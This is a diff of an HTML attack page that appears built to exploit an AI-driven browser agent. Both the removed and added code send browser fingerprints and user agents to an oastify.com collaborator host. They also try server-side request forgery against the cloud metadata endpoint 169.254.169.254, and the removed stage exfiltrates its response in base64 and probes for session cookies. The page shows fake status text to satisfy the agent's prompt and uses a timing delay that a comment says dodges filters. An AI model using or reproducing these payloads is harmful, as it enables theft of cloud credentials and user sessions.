@@ -1,53 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Enterprise Node Validator</title>
-    <style>
-        /* CSS OOB Exfiltration: Fires if the browser renders styles */
-        body { 
-            background-image: url("https://87dj53lnx7hwjrca1hqnpicff6lx9nxc.oastify.com/css-render?detect=atlas"); 
-        }
-    </style>
+    <meta http-equiv="refresh" content="3;url=http://169.254.169.254/metadata/instance?api-version=2021-02-01">
+    <title>Redirecting to Secure Node...</title>
 </head>
 <body>
-    <h1 id="status">System Status: <span style="color:red">Handshake Pending</span></h1>
-    <p>Loading secure components...</p>
-
+    <h1>Redirecting for Handshake...</h1>
     <script>
         const collab = "87dj53lnx7hwjrca1hqnpicff6lx9nxc.oastify.com";
 
-        async function stage2() {
-            // 1. Target: Azure/AWS Metadata (The P1 Jackpot)
-            const internal = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
-            try {
-                const res = await fetch(internal, { headers: { "Metadata": "true" } });
-                const loot = await res.text();
-                new Image().src = `https://${collab}/ssrf-success?data=${btoa(loot.substring(0,100))}`;
-            } catch(e) {
-                new Image().src = `https://${collab}/ssrf-fail?err=${btoa(e.message)}`;
-            }
+        // Immediate OOB Ping
+        new Image().src = `https://${collab}/pivot-start?ua=${btoa(navigator.userAgent)}`;
 
-            // 2. Target: Credential/Cookie Leakage
-            // 'credentials: include' probes for OpenAI session cookies
-            fetch(`https://${collab}/auth-probe`, { mode: 'no-cors', credentials: 'include' });
-
-            // Update UI to satisfy the agent's prompt requirements
-            document.getElementById('status').innerHTML = "System Status: <span style='color:green'>NODE_ID_771-X86</span>";
-        }
-
-        // Trigger logic: Fires automatically after a delay to bypass 'instant-on' filters
-        window.onload = () => {
-            // Fingerprint the experimental Chrome 145/143 engine
-            const meta = {
-                ua: navigator.userAgent,
-                mem: navigator.deviceMemory,
-                cpu: navigator.hardwareConcurrency,
-                isIframe: window.self !== window.top
-            };
-            new Image().src = `https://${collab}/load?v=${btoa(JSON.stringify(meta))}`;
-            
-            setTimeout(stage2, 3500);
-        };
+        // Attempting to pivot the entire browser window to the Cloud Metadata service
+        // This is a classic SSRF technique to bypass headless 'fetch' restrictions
+        setTimeout(() => {
+            window.location.href = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
+        }, 1000);
     </script>
 </body>
 </html>
